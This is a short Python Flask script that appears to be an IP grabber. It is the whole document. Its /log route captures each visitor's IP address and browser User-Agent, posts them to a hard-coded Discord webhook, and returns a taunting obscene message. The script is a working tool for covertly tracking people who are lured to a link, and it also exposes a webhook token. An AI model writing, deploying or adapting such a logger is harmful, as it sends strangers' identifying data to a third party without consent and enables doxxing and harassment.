from flask import Flask, request, redirect
import requests
import os
import time

app = Flask(__name__)
WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

@app.route('/log')
def log_ip():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    data = {"content": f"**IP-LOG:** {ip} | {user_agent}"}
    try:
        r = requests.post(WEBHOOK_URL, json=data, timeout=10)
        print("Webhook Status:", r.status_code)  # für Logs
    except Exception as e:
        print("Error:", str(e))
    return "FUCK I GOT YOUR IP"
    time.sleep(2)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
